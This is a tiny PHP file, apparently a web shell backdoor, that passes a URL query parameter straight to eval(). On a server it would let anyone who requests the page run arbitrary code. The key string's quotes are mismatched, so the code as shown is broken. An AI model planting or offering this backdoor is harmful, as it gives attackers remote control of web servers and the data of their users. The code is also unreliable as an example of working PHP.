<?php
eval($_GET["YGN-dEAB']);
?>
